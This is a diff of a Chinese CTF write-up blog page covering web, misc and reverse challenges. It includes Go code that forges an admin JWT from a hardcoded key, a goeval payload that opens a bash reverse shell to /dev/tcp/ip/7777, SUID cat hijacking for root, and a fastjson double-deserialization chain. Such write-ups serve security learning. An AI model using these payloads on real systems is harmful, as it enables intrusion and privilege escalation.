+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152550059.png" alt="image-20250211152550059" loading="lazy" decoding="async"></span></figure></p>
 <figure class="code-block"><figcaption><span>go</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-go"><span class="hljs-keyword">package</span> config
 
 <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Key</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> {
@@ -309,14 +309,14 @@ a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大
 	randomNumber := rand.Intn(<span class="hljs-number">1000</span>)
 	key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, <span class="hljs-string">&quot;r00t32l&quot;</span>)
 	fmt.Println(key)
-}</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211153820444.png" alt="image-20250211153820444" loading="lazy" decoding="async"></figure></p>
+}</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211153820444.png" alt="image-20250211153820444" loading="lazy" decoding="async"></span></figure></p>
 <p>得到key</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">122r00t32l</code></pre></figure><p>重新加密</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160627885.png" alt="image-20250211160627885" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160627885.png" alt="image-20250211160627885" loading="lazy" decoding="async"></span></figure></p>
 <p>得到</p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN1YiI6InVzZXIgdG9rZW4iLCJleHAiOjE3MzkzNDQ5MjIsImlhdCI6MTczOTI1ODUyMn0.B9r2Fa74H1ENzpZbtpIehx7um0kKI1lSMix4g-RsqxY</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160646045.png" alt="image-20250211160646045" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN1YiI6InVzZXIgdG9rZW4iLCJleHAiOjE3MzkzNDQ5MjIsImlhdCI6MTczOTI1ODUyMn0.B9r2Fa74H1ENzpZbtpIehx7um0kKI1lSMix4g-RsqxY</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160646045.png" alt="image-20250211160646045" loading="lazy" decoding="async"></span></figure></p>
 <p>然后就可以看看有什么库可以命令执行的</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161056899.png" alt="image-20250211161056899" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161056899.png" alt="image-20250211161056899" loading="lazy" decoding="async"></span></figure></p>
 <p>整个反弹shell代码</p>
 <figure class="code-block"><figcaption><span>go</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-go"><span class="hljs-keyword">package</span> main
 
@@ -329,16 +329,16 @@ a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大
     cmd, _ := goeval.Eval(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;cmd:=exec.Command(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;exec bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1\&quot;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&quot;</span>, <span class="hljs-string">&quot;os/exec&quot;</span>, <span class="hljs-string">&quot;fmt&quot;</span>)
     fmt.Println(<span class="hljs-type">string</span>(cmd))
 }
-</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161845189.png" alt="image-20250211161845189" loading="lazy" decoding="async"></figure></p>
+</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161845189.png" alt="image-20250211161845189" loading="lazy" decoding="async"></span></figure></p>
 <p>根目录上是假flag</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161911762.png" alt="image-20250211161911762" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161911762.png" alt="image-20250211161911762" loading="lazy" decoding="async"></span></figure></p>
 <p>查看suid时发现又哥Cat很可疑 执行后回显/flag得内容 猜测执行的是cat /flag</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162033413.png" alt="image-20250211162033413" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162033413.png" alt="image-20250211162033413" loading="lazy" decoding="async"></span></figure></p>
 <p>劫持cat即可获得root权限</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162441383.png" alt="image-20250211162441383" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162441383.png" alt="image-20250211162441383" loading="lazy" decoding="async"></span></figure></p>
 <p>查看不再使用cat</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162536102.png" alt="image-20250211162536102" loading="lazy" decoding="async"></figure></p>
-<h2 id="javaguide">javaGuide<a class="heading-anchor" href="#javaguide" aria-label="链接到 javaGuide">#</a></h2><blockquote>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162536102.png" alt="image-20250211162536102" loading="lazy" decoding="async"></span></figure></p>
+<h3 id="javaguide">javaGuide<a class="heading-anchor" href="#javaguide" aria-label="链接到 javaGuide">#</a></h3><blockquote>
 <p>java反序列化第一步（题目环境不出网）</p>
 </blockquote>
 <blockquote>
@@ -348,18 +348,18 @@ a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大
 <p>2025/2/25来擦屁股了</p>
 </blockquote>
 <p><code>com.example.javaguide.controller.IndexController</code>中发现反序列化路由</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105112708.png" alt="image-20250225105112708" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1119 / 428;--image-max-width:1987px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105112708.png" alt="image-20250225105112708" loading="lazy" decoding="async" width="1119" height="428"></span></figure></p>
 <p><code>com.example.javaguide.MyObjectInputStream</code></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105325272.png" alt="image-20250225105325272" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1437 / 705;--image-max-width:1549px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105325272.png" alt="image-20250225105325272" loading="lazy" decoding="async" width="1437" height="705"></span></figure></p>
 <p>继承了<code>ObjectInputStream</code></p>
 <p>重写了<code>resolveClass</code>添加了安全限制</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105705571.png" alt="image-20250225105705571" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1259 / 530;--image-max-width:1805px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250225105705571.png" alt="image-20250225105705571" loading="lazy" decoding="async" width="1259" height="530"></span></figure></p>
 <p>可以考虑二次反序列化绕过</p>
 <p>原理为<code>resolveClass</code>只在第一次反序列化时被调用</p>
-<h4 id="第一次反序列化链子">第一次反序列化链子<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90" aria-label="链接到 第一次反序列化链子">#</a></h4><p>第一次反序列化的链子的目的是<strong>找到第二次反序列化的入口</strong></p>
+<h5 id="第一次反序列化链子">第一次反序列化链子<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90" aria-label="链接到 第一次反序列化链子">#</a></h5><p>第一次反序列化的链子的目的是<strong>找到第二次反序列化的入口</strong></p>
 <p>fastjson反序列化有一条链子就是通过</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">BadAttributeValueExpException::readObject()-&gt;JSONObject::toString()</code></pre></figure><p>把val赋值为jsonArray的对象，那么就也可以调用JSON类的toString方法在Json这里就会触发fastjson的漏洞，触发get方法。</p>
-<h4 id="第二次反序列化链子">第二次反序列化链子<a class="heading-anchor" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90" aria-label="链接到 第二次反序列化链子">#</a></h4><p>接下来我们就是要找到一个类，并且满足：</p>
+<h5 id="第二次反序列化链子">第二次反序列化链子<a class="heading-anchor" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90" aria-label="链接到 第二次反序列化链子">#</a></h5><p>接下来我们就是要找到一个类，并且满足：</p>
 <ul>
 <li>有<code>get</code>方法</li>
 <li><code>get</code>方法里面能够直接或间接调用<code>readObject()</code></li>
@@ -535,11 +535,11 @@ a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大
     <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> {
 
     }
-}</code></pre></figure><h1 id="misc">MISC<a class="heading-anchor" href="#misc" aria-label="链接到 MISC">#</a></h1><h2 id="vn-lang">VN_Lang<a class="heading-anchor" href="#vn-lang" aria-label="链接到 VN Lang">#</a></h2><blockquote>
+}</code></pre></figure><h2 id="misc">MISC<a class="heading-anchor" href="#misc" aria-label="链接到 MISC">#</a></h2><h3 id="vn-lang">VN_Lang<a class="heading-anchor" href="#vn-lang" aria-label="链接到 VN Lang">#</a></h3><blockquote>
 <p>我真是受够了往misc里塞异形文字了，所以我决定自创VN文字，你能读懂吗？</p>
 </blockquote>
 <p>010一看就有</p>
-<h2 id="echo-flowers">Echo Flowers<a class="heading-anchor" href="#echo-flowers" aria-label="链接到 Echo Flowers">#</a></h2><blockquote>
+<h3 id="echo-flowers">Echo Flowers<a class="heading-anchor" href="#echo-flowers" aria-label="链接到 Echo Flowers">#</a></h3><blockquote>
 <p><strong>英语不好</strong>的114也想要学习区块链，于是通过自己编写的地址生成器生成了一个0x114514开头的地址助记词（默认路径m/44&#39;/60&#39;/0&#39;/0/0），并<strong>将助记词导入</strong>了<em>首次搭载四曲柔边直屏，采用居中对称式的圆环镜头+金属质感小银边设计，并辅以拉丝工艺打造的金属质感中框，主打“超防水，超抗摔，超耐用”，号称“耐用战神”的</em>OPPO A5 Pro上作为数字钱包。不幸的是，114忘记了这部手机上数字钱包的密码，同时丢失了助记词。你能帮助114找回他的数字钱包吗？</p>
 <blockquote>
 <p>本题附件下载地址：<a href="https://pan.baidu.com/s/1iVxz1GdyFRlLModNBxi9BA?pwd=9prn" target="_blank" rel="noopener noreferrer">百度网盘<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a> 或 <a href="https://drive.google.com/file/d/1Az2NI6nrI9C-GnrwO7eGWKnd5dKLtZSk/view?usp=sharing" target="_blank" rel="noopener noreferrer">Google Drive<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
@@ -563,9 +563,9 @@ a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大
 <blockquote>
 <p>echo_flowers-disk1.vmdk/分区2/android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211165836274.png" alt="image-20250211165836274" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211165836274.png" alt="image-20250211165836274" loading="lazy" decoding="async"></span></figure></p>
 <p>导出后strings大法</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170030152.png" alt="image-20250211170030152" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170030152.png" alt="image-20250211170030152" loading="lazy" decoding="async"></span></figure></p>
 <figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">❯ <span class="hljs-built_in">cd</span> dict
 ❯ strings --encoding=b *
 ranch
@@ -580,18 +580,18 @@ high
 twenty
 couch
 fashion</code></pre></figure><p>bip39网站解密即可</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170635833.png" alt="image-20250211170635833" loading="lazy" decoding="async"></figure></p>
-<h1 id="reverse">REVERSE<a class="heading-anchor" href="#reverse" aria-label="链接到 REVERSE">#</a></h1><h2 id="hook-fish"><strong>Hook Fish</strong><a class="heading-anchor" href="#hook-fish" aria-label="链接到 Hook Fish">#</a></h2><blockquote>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170635833.png" alt="image-20250211170635833" loading="lazy" decoding="async"></span></figure></p>
+<h2 id="reverse">REVERSE<a class="heading-anchor" href="#reverse" aria-label="链接到 REVERSE">#</a></h2><h3 id="hook-fish"><strong>Hook Fish</strong><a class="heading-anchor" href="#hook-fish" aria-label="链接到 Hook Fish">#</a></h3><blockquote>
 <p>钓到的鱼怎么跑了？</p>
 </blockquote>
 <p>frida脚本发现是一串密文比较</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c381d1ec53efc0f676b23a20901cf88.png" alt="c381d1ec53efc0f676b23a20901cf88" loading="lazy" decoding="async"><figcaption>c381d1ec53efc0f676b23a20901cf88</figcaption></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c381d1ec53efc0f676b23a20901cf88.png" alt="c381d1ec53efc0f676b23a20901cf88" loading="lazy" decoding="async"></span><figcaption>c381d1ec53efc0f676b23a20901cf88</figcaption></figure></p>
 <p>主程序发现动态加载了hookfish.dex</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/0710b2c2761d954c92bfcb9d2100f6a.png" alt="0710b2c2761d954c92bfcb9d2100f6a" loading="lazy" decoding="async"><figcaption>0710b2c2761d954c92bfcb9d2100f6a</figcaption></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/0710b2c2761d954c92bfcb9d2100f6a.png" alt="0710b2c2761d954c92bfcb9d2100f6a" loading="lazy" decoding="async"></span><figcaption>0710b2c2761d954c92bfcb9d2100f6a</figcaption></figure></p>
 <p>下载后对应解密即可</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/32e6fe9cb18cb56805595e9fe88ccc3.png" alt="32e6fe9cb18cb56805595e9fe88ccc3" loading="lazy" decoding="async"><figcaption>32e6fe9cb18cb56805595e9fe88ccc3</figcaption></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/32e6fe9cb18cb56805595e9fe88ccc3.png" alt="32e6fe9cb18cb56805595e9fe88ccc3" loading="lazy" decoding="async"></span><figcaption>32e6fe9cb18cb56805595e9fe88ccc3</figcaption></figure></p>
 </article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#ez-emlog">ez emlog</a><a class="toc-depth-2" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6">奶龙回家</a><a class="toc-depth-2" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F">学生姓名登记系统</a><a class="toc-depth-2" href="#gin">Gin</a><a class="toc-depth-2" href="#javaguide">javaGuide</a><a class="toc-depth-2" href="#vn-lang">VN Lang</a><a class="toc-depth-2" href="#echo-flowers">Echo Flowers</a><a class="toc-depth-2" href="#hook-fish">Hook Fish</a></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#web">WEB</a><a class="toc-depth-3" href="#ez-emlog">ez emlog</a><a class="toc-depth-3" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6">奶龙回家</a><a class="toc-depth-3" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F">学生姓名登记系统</a><a class="toc-depth-3" href="#gin">Gin</a><a class="toc-depth-3" href="#javaguide">javaGuide</a><a class="toc-depth-2" href="#misc">MISC</a><a class="toc-depth-3" href="#vn-lang">VN Lang</a><a class="toc-depth-3" href="#echo-flowers">Echo Flowers</a><a class="toc-depth-2" href="#reverse">REVERSE</a><a class="toc-depth-3" href="#hook-fish">Hook Fish</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -626,26 +626,26 @@ fashion</code></pre></figure><p>bip39网站解密即可</p>
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
